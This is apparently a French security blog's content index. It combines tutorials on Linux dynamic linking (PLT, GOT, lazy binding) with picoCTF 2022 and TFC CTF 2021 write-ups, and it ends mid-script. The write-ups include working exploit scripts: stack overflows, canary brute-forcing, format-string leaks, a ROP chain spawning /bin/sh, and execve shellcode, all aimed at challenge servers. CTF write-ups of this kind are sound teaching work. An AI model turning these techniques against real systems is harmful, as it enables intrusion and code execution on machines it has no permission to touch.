[{"categories":["Linux","ELF"],"content":"Linux libraries part 1 Dans cette partie 1 sur les librairies Linux, nous parlerons des binaires liés dynamiquement. Comment les symboles sont résolus dynamiquement. Le rôle du PLT \u0026 GOT et du linker. ","date":"2022-09-28","objectID":"/fr/linux-libraries-1/:0:0","tags":["Linux","ELF","Dynamic Linker","Shared libraries","PLT","GOT","LD","Lazy binding","pwn"],"title":"Linux libraries part 1","uri":"/fr/linux-libraries-1/"},{"categories":["Linux","ELF"],"content":"0x0 Intro Le binaire statiquement lié intègre toutes les bibliothèques dont il a besoin pour fonctionner au moment de la compilation, en revanche ce n’est pas le cas pour le binaire dynamiquement lié. Reprenons l’image du part0. Pour le statiquement lié, nous avons un call directe sur la fonction printf. Désassemblons et regardons à l’intérieur. Comme on peut le voir, nous avons évidemment le code du printf. Thinking Quand est-il pour le binaire dynamiquement lié ? // ami.c #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e int main(){ printf(\"I'm _R4v3n\"); exit(0); return 0; } gcc -m32 -o ami ami.c D’abord on peut constater qu’au lieu de printf on a printf@plt. Désassemblons quand même et voyons ce qui s’y trouve. Nous voyons que nous n’avons pas directement le code du printf mais un jump vers un emplacement suivi d’un push et d’un jump à la fin. Thinking Alors comment le printf est résolu ? ","date":"2022-09-28","objectID":"/fr/linux-libraries-1/:1:0","tags":["Linux","ELF","Dynamic Linker","Shared libraries","PLT","GOT","LD","Lazy binding","pwn"],"title":"Linux libraries part 1","uri":"/fr/linux-libraries-1/"},{"categories":["Linux","ELF"],"content":"0x1 Le linker dynamique Au démarrage d’un binaire ELF lié dynamiquement, le noyau charge l’image ELF du binaire dans la mémoire virtuelle de l’espace utilisateur. Au chargement, une section .interp est détectée par le noyau. Cette section contient le nom du chemin (path) d’un interpréteur de programme. Il s’agit de l’éditeur de liens dynamiques, /lib64/ld-linux-x86-64.so.2 dans mon cas sur l’image ci-dessus. Affichons le contenu de la section .interp et voyons concrètement ce qu’elle contient. Évidemment la section .interp contient le path de l’éditeur de liens dynamiques. Le noyau démarrera l’éditeur de liens dynamiques, qui s’initialise et charge les objets partagés dont le binaire a besoin. Affichons la liste des objets partagés dont le binaire a besoin avec la commande ldd. Une fois que l’éditeur de liens termine son travail, le programme d’origine commence son exécution. Au cours de l’exécution, l’éditeur de liens sera encore appelé pour la résolution de symbole. En fait, tous les symboles ne sont pas résolus à l’exécution. Tant qu’un symbole n’est pas réellement utilisé, il n’est pas résolu: on appelle ce processus le Lazy binding. Quand une fonction est appelée pour la première fois, l’éditeur de liens recherche l’adresse de cette fonction dans la libc et fournie un mécanisme pour l’appel de la fonction: c’est ce qu’on appelle relocation. Thinking Comment se déroule alors le processus de résolution de symbole ? ","date":"2022-09-28","objectID":"/fr/linux-libraries-1/:2:0","tags":["Linux","ELF","Dynamic Linker","Shared libraries","PLT","GOT","LD","Lazy binding","pwn"],"title":"Linux libraries part 1","uri":"/fr/linux-libraries-1/"},{"categories":["Linux","ELF"],"content":"0x2 PLT \u0026 GOT | relocation Plusieurs sections interviennent dans ce processus de résolution. .plt : Procedure Linkage Table (table de liaison de procédures). Elle est utilisée pour appeler des procédures/fonctions externes dont l’adresse n’est pas connue au moment de la liaison et doit être résolue par l’éditeur de liens dynamiques au moment de l’exécution. Ça contient un morceau de code qui recherche les adresses dans la section .got.plt et saute à la bonne adresse si l’adresse est déjà résolue, soit déclenche le code dans l’éditeur de liens pour rechercher l’adresse. .got : Global Offset Table Il s’agit de la table réelle des décalages remplie par l’éditeur de liens pour les symboles externes. .got.plt : Il est également une partie de la .got. Il contient les adresses cibles (après qu’elles ont été recherchées) ou une adresse de retour dans le .plt pour déclencher la recherche. Voyons un peu plus en pratique comment se passe la résolution du symbole et quel est le rôle de ces sections. Prenons ce code // ami.c #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e int main(){ printf(\"I'm _R4v3n\"); return 0; } Compilons et débuggons avec GDB pour mieux voir. gcc -m32 -o ami ami.c Dans mon cas je vais utiliser le plugin GEF. Le main: Puis un call sur printf@plt L’adresse de notre call de printf@plt pointe dans la section .plt. Autrement dit, l’adresse 0x1040 de printf@plt se situe dans la plage 0x00001020 - 0x00001060 qui est celle de la section .plt. Le contenu de la section .plt: La section .plt est composée de sous-sections qu’on peut appeler entré. Ici nous avons 4 entrées: entrée 0, 1, 2, 3 composée chacune de trois instructions. L’entrée 0 est un peu spéciale, les autres entrées suivent le même schéma: nous avons un jump suivi d’un push et d’un jump. L’entre 2 pour printf L’entre 3 pour exit Au niveau de la première instruction de chaque entré, nous avons un jump vers un pointeur. Le processeur déréférencera le pointeur et sautera à l’adresse obtenue. Si on jette un petit coup d’oeil, on constate que ces adresses obtenues par déréférencement sont proches, y compris celui de l’entrée 0. Pour ça, mettons un breakpoint au niveau du call de printf@plt et lançons le programme pour mieux voir. Évidemment ces adresses sont proches (0x56558ffc, 0x56559000, 0x56559004, 0x56559008) et pointent toutes dans la section .got.plt. Nous, notre call de printf@plt saute directement à l’adresse 0x56556040 dans la section .plt, suivons ça. La première instruction est un jump dans le .got.plt à l’adresse 0x56556046 obtenu par déréférencement du pointeur DWORD PTR [ebx+0x10]. Affichons ce qui se trouve à cette adresse obtenue. Keep $ebx+0x10 —-\u003e 0x56559004 (got.plt) –\u003e 0x56556046 (plt) Nous pouvons constater qu’il s’agit de l’adresse de l’instruction suivante dans le plt : 0x56556046 \u003cprintf@plt+6\u003e: push 0x8 Autrement dit, ça nous ramène a l’instruction suivante. Normalement nous devons obtenir l’adresse de printf à cette adresse 0x56559004 dans le .got.plt mais nous avons l’adresse de l’instruction suivante. Tip Vous vous êtes sans doute demandé pourquoi. Si vous ne vous êtes pas posé la question alors ça ne fait rien. Cela s’explique par le fait que nous n’avons jamais appelé printf avant et que nous devons déclencher la première recherche. Je parle de la recherche de l’adresse de printf dans la libc, bien sûr. Une fois à l’instruction suivante, l’offset 0x8 est poussés sur la pile. Après ça, nous avons un jump à l’adresse 0x56556020, ça nous amène à l’entrée 0 de .plt À l’entrée 0, nous avons quatres instructions. La premiere empile la valeur 0x56558ff8, qui se trouve dans le .got.plt et qui pointe sur 0xf7ffd9e0 dans la section .bss du linker. Keep $ebx+0x4 —-\u003e 0x56558ff8 (got.plt) –\u003e 0xf7ffd9e0 (.bss in /lib/ld-linux.so.2) À la deuxième instruction, nous avons un jump vers l’adresse 0xf7fdc1b0, qui se trouve dans le .text du linker. Keep $ebx+0x8 —-\u003e 0x56558ffc (got.plt) –\u003e 0xf7fdc1b0 (.text in /lib/ld-linux.so.2) Comme c’est la première fois qu’on appe","date":"2022-09-28","objectID":"/fr/linux-libraries-1/:3:0","tags":["Linux","ELF","Dynamic Linker","Shared libraries","PLT","GOT","LD","Lazy binding","pwn"],"title":"Linux libraries part 1","uri":"/fr/linux-libraries-1/"},{"categories":["Linux","ELF"],"content":"0x3 Exploitation GOT Overwrite Ret2libc Références IBM : Anatomy of Linux dynamic libraries Sections of an ELF File Lazy Loading of Dynamic Dependencies ","date":"2022-09-28","objectID":"/fr/linux-libraries-1/:4:0","tags":["Linux","ELF","Dynamic Linker","Shared libraries","PLT","GOT","LD","Lazy binding","pwn"],"title":"Linux libraries part 1","uri":"/fr/linux-libraries-1/"},{"categories":["Linux","ELF"],"content":"Librairies Linux part0 Dans cette série d’articles, j’expliquerai ce que j’ai compris des librairies Linux. Dans cette série d’articles, j’expliquerai ce que j’ai compris des librairies Linux. Au début quand j’ai commencé le Buffer Overflow je me suis senti coincé car il me manquait des notions de base comme comment fonctionnent les librairies Linux, le PLT \u0026 GOT, le Linker dynamic, les objets partagés, etc … Alors j’ai cherché à comprendre et aujourd’hui je pensais écrire un article à ce sujet et y revenir plus tard si nécessaire et aussi si cela pouvait aider quelqu’un. ","date":"2022-06-07","objectID":"/fr/linux-libraries/:0:0","tags":["Linux","ELF","Dynamic Linker","Shared libraries"],"title":"Linux libraries part 0","uri":"/fr/linux-libraries/"},{"categories":["Linux","ELF"],"content":"C’est quoi une librairie ? Lorsque vous codez en C, vous utilisez des fonctions comme printf pour imprimer ou scanf pour saisir, etc. Ces fonctions, vous ne les avez pas codé vous même mais vous les utilisez. Ou se trouve donc ces fonctions ? Ces fonctions se trouve dans une librairie sur votre système. Cette librairie est un ensemble de fonctions déjà précodées que vous n’avez plus besoin de recoder à chaque fois mais les utiliser directement. Vous allez donc gagner énormément de temps. Ici j’ai pris l’exemple de fonction mais une librairie ne comporte pas uniquement de fonction, il y a aussi des variables, etc… En bref, les librairies sont un moyen facile pour réutiliser le code. Elles permettent de regrouper des fonctionnalités similaires dans une seule unité. Ces unités permettent aux développeurs d’écrire leur code à partir de module: ce qu’on appelle la programmation modulaire. Sous Linux, il y a deux types de librairie, les librairies statiques et les librairies dynamiques (librairie partagée). ","date":"2022-06-07","objectID":"/fr/linux-libraries/:1:0","tags":["Linux","ELF","Dynamic Linker","Shared libraries"],"title":"Linux libraries part 0","uri":"/fr/linux-libraries/"},{"categories":["Linux","ELF"],"content":"Les librairies statiques A ce niveau l’édition de liens est faite de manière statique. C’est-à-dire, au moment de la compilation toutes les bibliothèques dont l’exécutable a besoin pour fonctionner sont intégrer à l’intérieur. ","date":"2022-06-07","objectID":"/fr/linux-libraries/:2:0","tags":["Linux","ELF","Dynamic Linker","Shared libraries"],"title":"Linux libraries part 0","uri":"/fr/linux-libraries/"},{"categories":["Linux","ELF"],"content":"Avantages: Tous les symboles sont résolus à l’exécution. Les appels fonction sont rapides. Exemple: ","date":"2022-06-07","objectID":"/fr/linux-libraries/:2:1","tags":["Linux","ELF","Dynamic Linker","Shared libraries"],"title":"Linux libraries part 0","uri":"/fr/linux-libraries/"},{"categories":["Linux","ELF"],"content":"Inconvenients Les bibliothèques se trouvent dupliquer dans chaque exécutable. On utilise donc beaucoup d’espace sur la machine. Si on met à jour la fonction printf dans la librairie par exemple, il faut donc recompiler tous les exécutables. Exemple: test.c #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e int main(){ printf(\"I'm _R4v3n\"); return 0; } gcc -o test test.c gcc -static -o test_static test.c -static pour compilier en mode statique. Quand c’est statique la taille est élevée. Ici, on a utilisé uniquement la fonction printf. Au fur et à mesure que nous utiliserons des fonctions dans notre code, la taille de l’exécutable augmentera. Pour vérifier si l’exécutable est statiquement liée. ","date":"2022-06-07","objectID":"/fr/linux-libraries/:2:2","tags":["Linux","ELF","Dynamic Linker","Shared libraries"],"title":"Linux libraries part 0","uri":"/fr/linux-libraries/"},{"categories":["Linux","ELF"],"content":"Les librairies dynamique Dans la prochaîne partie nous verrons les librairies dynamique. Prérequis : Base en Assembleur, GDB References IBM : Anatomy of Linux dynamic libraries ","date":"2022-06-07","objectID":"/fr/linux-libraries/:3:0","tags":["Linux","ELF","Dynamic Linker","Shared libraries"],"title":"Linux libraries part 0","uri":"/fr/linux-libraries/"},{"categories":[],"content":" 2022 Reverse engineering training Lead. Organizer : #BjWhiteHat Reverse engineering Today I led a training on reverse engineering organized by #BjWhiteHat. Next time, we will work on Buffer overflow, Malware Analysis, Binary patch, etc.. @auberiic @michpice04 @LSemassa @Anssi_Benin #infosec #reverse #bj pic.twitter.com/Ru59M9nn1q — _R4v3n AM1 (@w31rdr4v3n) May 28, 2022 Première place(1e) au picoCTF Africa 2022 avec ma team Ph0n1X. Organisateur: picoCTF \u0026 Cylab 2020 Troisième place(3e) au HackerLab2020 avec ma team Und3r_Th3_R00T. Organisateur: ANSSI Bénin ","date":"2022-03-31","objectID":"/fr/events/:0:0","tags":[],"title":"Evénements","uri":"/fr/events/"},{"categories":[],"content":" Analyste développeur Analyste SOC Chercheur en sécurité Exploitation Noyau Linux Exploit Dev CTF Player [Habileté: Pwn, Reverse] ","date":"2022-03-30","objectID":"/fr/about/:0:0","tags":[],"title":"À propos de moi","uri":"/fr/about/"},{"categories":["CTF"],"content":"Cet article présente des corrigés des défis du picoCTF 2022.","date":"2022-03-29","objectID":"/fr/picoctf2022-writeup/","tags":["picoCTF","pwn","reverse","crypto","forensic"],"title":"picoCTF2022 Writeup","uri":"/fr/picoctf2022-writeup/"},{"categories":["CTF"],"content":"picoCTF 2022 Cet article présente des corrigés des défis du picoCTF 2022. ","date":"2022-03-29","objectID":"/fr/picoctf2022-writeup/:0:0","tags":["picoCTF","pwn","reverse","crypto","forensic"],"title":"picoCTF2022 Writeup","uri":"/fr/picoctf2022-writeup/"},{"categories":["CTF"],"content":"basic-file-exploit [Pwn] Le menu du programme : créer ou lire des entrées dans la base de données. $ nc saturn.picoctf.net 49700 Hi, welcome to my echo chamber! Type '1' to enter a phrase into our database Type '2' to echo a phrase in our database Type '3' to exit the program Dans le code source, avec le numéro d’entrée 0 on pourra afficher le flag. if ((entry_number = strtol(entry, NULL, 10)) == 0) { puts(flag); fseek(stdin, 0, SEEK_END); exit(0); } Result: ","date":"2022-03-29","objectID":"/fr/picoctf2022-writeup/:1:0","tags":["picoCTF","pwn","reverse","crypto","forensic"],"title":"picoCTF2022 Writeup","uri":"/fr/picoctf2022-writeup/"},{"categories":["CTF"],"content":"buffer overflow 0 [Pwn] ","date":"2022-03-29","objectID":"/fr/picoctf2022-writeup/:2:0","tags":["picoCTF","pwn","reverse","crypto","forensic"],"title":"picoCTF2022 Writeup","uri":"/fr/picoctf2022-writeup/"},{"categories":["CTF"],"content":"buffer overflow 1 [Pwn] $ file vuln vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=96273c06a17ba29a34bdefa9be1a15436d5bad81, for GNU/Linux 3.2.0, not stripped Le binaire est de 32 bits. void vuln(){ char buf[BUFSIZE]; gets(buf); printf(\"Okay, time to return... Fingers Crossed... Jumping to 0x%x\\n\", get_return_address()); } La taille des données entrées via gets(buf) n’est pas contrôlée, on peut donc entrer n’importe quoi. Ce qui peut causer un buffer overflow. Il suffit de contrôler l’addresse de retour pour rediriger le flux d’exécution vers la fonction win() afin d’afficher le flag. Dans gdb, j’ai placé un breakpoint sur le ret de vuln() Pour un test, j’envoie ce payload: “A”*(32+4+4+4) + “BBBB” Le EIP est bien atteint. Il reste à rediriger le flux d’exécution vers la fonction win() à l’adresse 0x080491f6. from pwn import * #sh = process(\"./vuln\") sh = remote(\"saturn.picoctf.net\",54376) print(sh.recv().decode()) sh.sendline(b\"A\"*(32+4+4+4)+p32(0x080491f6)) sh.interactive() Result: ","date":"2022-03-29","objectID":"/fr/picoctf2022-writeup/:3:0","tags":["picoCTF","pwn","reverse","crypto","forensic"],"title":"picoCTF2022 Writeup","uri":"/fr/picoctf2022-writeup/"},{"categories":["CTF"],"content":"RPS [Pwn] if (wins \u003e= 5) { puts(\"Congrats, here's the flag!\"); puts(flag); } Si on gagne 5 fois, on a le flag. char* hands[3] = {\"rock\", \"paper\", \"scissors\"}; char* loses[3] = {\"paper\", \"scissors\", \"rock\"}; .... int computer_turn = rand() % 3; printf(\"You played: %s\\n\", player_turn); printf(\"The computer played: %s\\n\", hands[computer_turn]); if (strstr(player_turn, loses[computer_turn])) { puts(\"You win! Play again?\"); return true; } else { puts(\"Seems like you didn't win this time. Play again?\"); return false; } Pour gagner, il faut que le choix de l’ordinateur existe dans le choix de joueur. J’ai donc utilisé paperscissorsrock pour gagner les 5 fois. ","date":"2022-03-29","objectID":"/fr/picoctf2022-writeup/:4:0","tags":["picoCTF","pwn","reverse","crypto","forensic"],"title":"picoCTF2022 Writeup","uri":"/fr/picoctf2022-writeup/"},{"categories":["CTF"],"content":"x-sixty-what [Pwn] Overflow x64 code from pwn import * sh = process(\"./vuln\") print(sh.recv().decode()) sh.sendline(b\"A\"*(64+8) + p64(0x00401236)) # flag() adresse: 0x00401236 sh.interactive() çà a marché en local mais pas sur le server distant. Il s’agit d’un souci de Movaps stack alignment. Movaps stack alignment Si vous faites une erreur de segmentation sur une instruction movaps dans buffered_vfprintf() ou do_system() dans les défis x86_64, assurez-vous que la pile est alignée sur 16 octets avant de revenir aux fonctions GLIBC telles que printf() ou system().En savoir plus… La solution consiste à appeler le ret d’une autre adresse une fois de plus avant d’appeler la fonction flag() lors de la conception de la pile de débordement, afin que l’adresse rsp puisse être réduite de 8. J’ai utilisé l’adresse de retour de init. Pour le trouver: objdump vuln -M intel –disassemble=_init from pwn import * sh = remote(\"saturn.picoctf.net\",58049) print(sh.recv().decode()) sh.sendline(b\"A\"*(64+8) + p64(0x0040101a) + p64(0x00401236)) sh.interactive() ","date":"2022-03-29","objectID":"/fr/picoctf2022-writeup/:5:0","tags":["picoCTF","pwn","reverse","crypto","forensic"],"title":"picoCTF2022 Writeup","uri":"/fr/picoctf2022-writeup/"},{"categories":["CTF"],"content":"buffer overflow 2 [Pwn] Contrôle de l’adresse de retour et des arguments Appel fonction 32 bits: fun_addr + 4 octets + arg0 + arg1 + arg2 + …. + argn from pwn import * sh = remote(\"saturn.picoctf.net\",60889) print(sh.recv().decode()) sh.sendline(b\"A\"*(100+4+4+4) + p32(0x08049296) + b\"P\"*4 + p32(0xCAFEF00D) + p32(0xF00DF00D)) sh.interactive() ","date":"2022-03-29","objectID":"/fr/picoctf2022-writeup/:6:0","tags":["picoCTF","pwn","reverse","crypto","forensic"],"title":"picoCTF2022 Writeup","uri":"/fr/picoctf2022-writeup/"},{"categories":["CTF"],"content":"buffer overflow 3 [Pwn] Brute force canary: from pwn import * canary = b'' while len(canary) \u003c 4: for i in range(256): sh = remote(\"saturn.picoctf.net\",54629) sh.sendlineafter('\u003e ', '{}'.format(64 + len(canary) + 1)) a = '{}'.format(chr(i)) sh.sendlineafter('\u003e ', b'A' * 64 + canary + a.encode()) log.info('Partial canary: {}'.format(canary)) if b'*** Stack Smashing Detected' not in sh.recvline(): canary += chr(i).encode() log.info('Partial canary: {}'.format(canary)) break sh.close() log.info('Found canary: {}'.format(canary)) Exploit: from pwn import * canary = b\"BiRd\" while True: p = remote(\"saturn.picoctf.net\",60398) p.sendlineafter(\"Buffer?\\n\u003e \", str(0x100)) # Size of payload payload = b\"A\"*64 + canary + b\"A\"*16 + p32(0x08049336) p.sendlineafter(\"Input\u003e \", payload) out = p.recvall() if b\"pico\" in out: print(out.decode()) break p.close() ","date":"2022-03-29","objectID":"/fr/picoctf2022-writeup/:7:0","tags":["picoCTF","pwn","reverse","crypto","forensic"],"title":"picoCTF2022 Writeup","uri":"/fr/picoctf2022-writeup/"},{"categories":["CTF"],"content":"flag leak [Pwn] Format Strings from pwn import * for i in range(100): sh = remote(\"saturn.picoctf.net\",50120) print(sh.recv().decode()) payload = '%{}$s'.format(i) sh.sendline(payload.encode()) data = sh.recvall() print(data) sh.close() Flag: picoCTF{L34k1ng_Fl4g_0ff_St4ck_eb9b46a2} ","date":"2022-03-29","objectID":"/fr/picoctf2022-writeup/:8:0","tags":["picoCTF","pwn","reverse","crypto","forensic"],"title":"picoCTF2022 Writeup","uri":"/fr/picoctf2022-writeup/"},{"categories":["CTF"],"content":"ropfu [Pwn] What’s ROP? Static ROP J’ai créé mon shellcode à partir des gadgets ROP. ROPgadget --binary ./vuln --rop --badbytes \"0a\" Exploit : from pwn import * import sys import subprocess sh = remote(\"saturn.picoctf.net\",55455) # ROPgadget --binary ./vuln --rop --badbytes \"0a\" from struct import pack p = b'a'*(16+4+4+4) p += pack('\u003cI', 0x080583c9) # pop edx ; pop ebx ; ret p += pack('\u003cI', 0x080e5060) # @ .data p += pack('\u003cI', 0x41414141) # padding p += pack('\u003cI', 0x080b074a) # pop eax ; ret p += b'/bin' p += pack('\u003cI', 0x08059102) # mov dword ptr [edx], eax ; ret p += pack('\u003cI', 0x080583c9) # pop edx ; pop ebx ; ret p += pack('\u003cI', 0x080e5064) # @ .data + 4 p += pack('\u003cI', 0x41414141) # padding p += pack('\u003cI', 0x080b074a) # pop eax ; ret p += b'//sh' p += pack('\u003cI', 0x08059102) # mov dword ptr [edx], eax ; ret p += pack('\u003cI', 0x080583c9) # pop edx ; pop ebx ; ret p += pack('\u003cI', 0x080e5068) # @ .data + 8 p += pack('\u003cI', 0x41414141) # padding p += pack('\u003cI', 0x0804fb90) # xor eax, eax ; ret p += pack('\u003cI', 0x08059102) # mov dword ptr [edx], eax ; ret p += pack('\u003cI', 0x08049022) # pop ebx ; ret p += pack('\u003cI', 0x080e5060) # @ .data p += pack('\u003cI', 0x08049e39) # pop ecx ; ret p += pack('\u003cI', 0x080e5068) # @ .data + 8 p += pack('\u003cI', 0x080583c9) # pop edx ; pop ebx ; ret p += pack('\u003cI', 0x080e5068) # @ .data + 8 p += pack('\u003cI', 0x080e5060) # padding without overwrite ebx p += pack('\u003cI', 0x0804fb90) # xor eax, eax ; ret p += pack('\u003cI', 0x0808055e) # inc eax ; ret p += pack('\u003cI', 0x0808055e) # inc eax ; ret p += pack('\u003cI', 0x0808055e) # inc eax ; ret p += pack('\u003cI', 0x0808055e) # inc eax ; ret p += pack('\u003cI', 0x0808055e) # inc eax ; ret p += pack('\u003cI', 0x0808055e) # inc eax ; ret p += pack('\u003cI', 0x0808055e) # inc eax ; ret p += pack('\u003cI', 0x0808055e) # inc eax ; ret p += pack('\u003cI', 0x0808055e) # inc eax ; ret p += pack('\u003cI', 0x0808055e) # inc eax ; ret p += pack('\u003cI', 0x0808055e) # inc eax ; ret p += pack('\u003cI', 0x0804a3d2) # int 0x80 print(sh.recv().decode()) sh.sendline(p) sh.interactive() ","date":"2022-03-29","objectID":"/fr/picoctf2022-writeup/:9:0","tags":["picoCTF","pwn","reverse","crypto","forensic"],"title":"picoCTF2022 Writeup","uri":"/fr/picoctf2022-writeup/"},{"categories":["CTF"],"content":"wine [Pwn] J’ai resolu directement ce challenge sans travailler sur le binaire(gdb, etc..) from pwn import * sh = remote(\"saturn.picoctf.net\",56673) print(sh.recv().decode()) payload = b\"A\"*(128+4+4+4) + p32(0x00401530) sh.sendline(payload) sh.interactive() ","date":"2022-03-29","objectID":"/fr/picoctf2022-writeup/:10:0","tags":["picoCTF","pwn","reverse","crypto","forensic"],"title":"picoCTF2022 Writeup","uri":"/fr/picoctf2022-writeup/"},{"categories":["CTF"],"content":"function overwrite [Pwn] Remarque Quand j’ai lu le code, j’ai compris que check pointe sur hard_checker. Pour l’exploiter, il faudrait pointer check sur easy_checker. Ensuite, il faut remplir story avec des valeurs dont la somme est égale à 1337 story pourrait être abcdefghijklk, la somme est effectivement égale à 1337. Pour pointer check sur easy_checker, j’ai pensé à Write-what-where Condition vuln() fonction ...... if (num1 \u003c 10) { fun[num1] += num2; } ..... On va se servir du tableau d’entier fun pour accéder à check afin de le pointer sur easy_checker. On va utiliser l’indice num1 du tableau fun pour accéder à check et num2 pour modifier sa valeur. Premièrement, on détermine l’offset entre fun et check pour le num1. 0x0804c040 check 0x0804c080 fun 0x0804c080 - 0x0804c040 = 64 fun - check = 64 fun - 64 = check Pour accéder à check il faut soustraire 64 de l’adresse de fun. Comme num1 est de type int, num1 = -64/sizeof(int) Deuxiement, on pointe check sur easy_checker. check pointe sur hard_checker Pour le pointer sur easy_checker, il faut d’abord déterminer l’offset entre hard_checker et easy_checker. 0x8049436 - 0x80492fc = 314 hard_checker - easy_checker = 314 hard_checker - 314 = easy_checker Donc, pour pointer check sur easy_checker il faut soustraire 314 de l’adresse de hard_checker. Comme check contient l’adresse de hard_checker, on dimunie sa valeur de 314. num2 = -314 Exploit: from pwn import * sh = remote(\"saturn.picoctf.net\",53163) print(sh.recv().decode()) sh.sendline(b\"abcdefghijklk\") print(sh.recv().decode()) sh.sendline(b\"-16 -314\") print(sh.recv().decode()) Result: ","date":"2022-03-29","objectID":"/fr/picoctf2022-writeup/:11:0","tags":["picoCTF","pwn","reverse","crypto","forensic"],"title":"picoCTF2022 Writeup","uri":"/fr/picoctf2022-writeup/"},{"categories":["CTF"],"content":"stack cache [Pwn] #define BUFSIZE 16 #define FLAGSIZE 64 void win() { char buf[FLAGSIZE]; char filler[BUFSIZE]; FILE *f = fopen(\"flag.txt\",\"r\"); if (f == NULL) { printf(\"%s %s\", \"Please create 'flag.txt' in this directory with your\", \"own debugging flag.\\n\"); exit(0); } fgets(buf,FLAGSIZE,f); // size bound read } La fonction win() ne permet pas d’afficher le flag mais de lire çà dans le tableau buf. Il nous faut chercher une manière de divulguer le flag contenu dans tableau buf. #define BUFSIZE 16 void UnderConstruction() { // this function is under construction char consideration[BUFSIZE]; char *demographic, *location, *identification, *session, *votes, *dependents; char *p,*q, *r; // *p = \"Enter names\"; // *q = \"Name 1\"; // *r = \"Name 2\"; unsigned long *age; printf(\"User information : %p %p %p %p %p %p\\n\",demographic, location, identification, session, votes, dependents); printf(\"Names of user: %p %p %p\\n\", p,q,r); printf(\"Age of user: %p\\n\",age); fflush(stdout); } La fonction UnderConstruction() fera l’affaire. Il suffit maintenant de rédirigé le flux d’exécution vers la fonction win() ensuite vers la fontion UnderConstruction(). from pwn import * sh = remote('saturn.picoctf.net', 56141) eip = p32(0x08049da0) # win() esp = p32(0x08049e20) # UnderConstruction() print(sh.recvuntil(b\"Give me a string that gets you the flag\").decode()) sh.sendline(b\"A\"*(10 +4) + rip + esp) sh.interactive() J’ai écrit un script python pour çà. from binascii import unhexlify cache = ['080c9a04', '0804007d', '61333337', '31646239', '5f597230', '6d334d5f', '50755f4e', '34656c43', '7b465443', '6f636970'] flag = \"\" for pin in cache: try: flag += unhexlify(pin).decode() except:pass print(flag[::-1]) ","date":"2022-03-29","objectID":"/fr/picoctf2022-writeup/:12:0","tags":["picoCTF","pwn","reverse","crypto","forensic"],"title":"picoCTF2022 Writeup","uri":"/fr/picoctf2022-writeup/"},{"categories":["CTF"],"content":"Cet article présente des corrigés des défis du TFC CTF 2021.","date":"2021-12-23","objectID":"/fr/tfcctf2021-writeup/","tags":["ctf","crypto","misc","pwn"],"title":"TFC CTF 2021 Writeup","uri":"/fr/tfcctf2021-writeup/"},{"categories":["CTF"],"content":"TFC CTF 2021 Cet article présente des corrigés des défis du TFC CTF 2021. ","date":"2021-12-23","objectID":"/fr/tfcctf2021-writeup/:0:0","tags":["ctf","crypto","misc","pwn"],"title":"TFC CTF 2021 Writeup","uri":"/fr/tfcctf2021-writeup/"},{"categories":["CTF"],"content":"Jumpy [Pwn] Pièce jointe:here Sortie de checksec $ checksec jumpy Le NX est désactivé donc nous pouvons exécuter sur la pile. Code C de Jumpy obtenu par l’ingénierie inverse avec ghidra. Dans le binaire, il n’y a pas de fonction system ni aucune fonction pour lire le drapeau. Comme le stack est exécutable, nous pouvons pushé du shellcode là-dessus et l’exécuter. Premièrement, nous avons besoin de contrôler le RIP. J’ai placé un breakpoint sur le ret de la fonction main. Avec 0x38 nous pouvons atteindre le RIP. Pour un test, j’envoie cette charge: “A”*0x38 + “BBBB” Le RIP est bien atteint. Nous pouvons maintenant exécuter notre shellcode sur la pile. payload = “A”*0x38 + RSP_addr + shellcode Nous allons pushé le shellcode sur le RSP et appelé l’adresse de RSP dans le RIP pour pourvoir exécuter le shellcode. Nous n’avons pas l’adresse de RSP mais en faisant un pétit recherche dans le binaire nous avons une instruction qui fait un jump sur le RSP, çà fera l’affaire. Avec l’adresse de cette instruction dans le RIP, nous pouvons faire un saut dans le RSP et exécuter ce qui est à l’intérieur. payload = “A”*0x38 + p64(0x00401142) + shellcode Exploit: from pwn import * sh = process(\"./jumpy\") #sh = remote(\"34.65.228.239\",1337) shellcode = b\"\\x31\\xf6\\x48\\xbf\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdf\\xf7\\xe6\\x04\\x3b\\x57\\x54\\x5f\\x0f\\x05\" payload = b\"A\"*0x38 + p64(0x00401142) + shellcode print(sh.recv().decode()) sh.sendline(payload) sh.interactive() Result: ","date":"2021-12-23","objectID":"/fr/tfcctf2021-writeup/:1:0","tags":["ctf","crypto","misc","pwn"],"title":"TFC CTF 2021 Writeup","uri":"/fr/tfcctf2021-writeup/"},{"categories":["CTF"],"content":"Secret [Pwn] Pièce jointe:here from pwn import * sh = process(\"./secret\") print(sh.recv().decode()) sh.sendline(p32(0xaabbccdd)*2) print(sh.recvall().decode()) Result: ","date":"2021-12-23","objectID":"/fr/tfcctf2021-writeup/:2:0","tags":["ctf","crypto","misc","pwn"],"title":"TFC CTF 2021 Writeup","uri":"/fr/tfcctf2021-writeup/"},{"categories":["CTF"],"content":"Santa [Pwn] Pièce jointe:here Sortie de checksec $ checksec santa Le NX est activé, nous ne pouvons donc rien exécuter sur la pile, mais hors de la pile. Dans ce cas, nous allons cibler le RSP. Exécutons le binaire. Code C de Santa obtenu par l’ingénierie inverse avec ghidra. J’ai trouvé une fonction flag. Ici, on aura à provoquer un buffer overflow et exécuter le code de la fonction flag mais pas sur la stack. Pour atteindre le RSP: “A” * 0x38 + “BBBBBBBB” On voit bien que le RSP est atteint. Nous pouvons maintenant écrire notre exploit pour exécuter la fonction flag. Adresse de fonction flag : 0x00401152 Vous pouvez le trouver dans gdb avec la commande : info functions Exploit: from pwn import * #sh = remote(\"server.challenge.ctf.thefewchosen.com\",1340) sh = process(\"./santa\") payload = b\"A\"*(0x38) + p64(0x00401152) print(sh.recv().decode()) sh.sendline(payload) print(sh.recv().decode()) Result: Mais il y a un souci. Lorsque je l’ai utilisé sur le serveur distant, cela n’a pas fonctionné. [*] Got EOF while reading in interactive Movaps stack alignment Si vous faites une erreur de segmentation sur une instruction movaps dans buffered_vfprintf() ou do_system() dans les défis x86_64, assurez-vous que la pile est alignée sur 16 octets avant de revenir aux fonctions GLIBC telles que printf() ou system().En savoir plus… La solution consiste à appeler le ret d’une autre adresse une fois de plus avant d’appeler la fonction flag() lors de la conception de la pile de débordement, afin que l’adresse rsp puisse être réduite de 8. J’ai utilisé l’adresse de retour de init. Pour le trouver: objdump santa -M intel –disassemble=_init New exploit: from pwn import 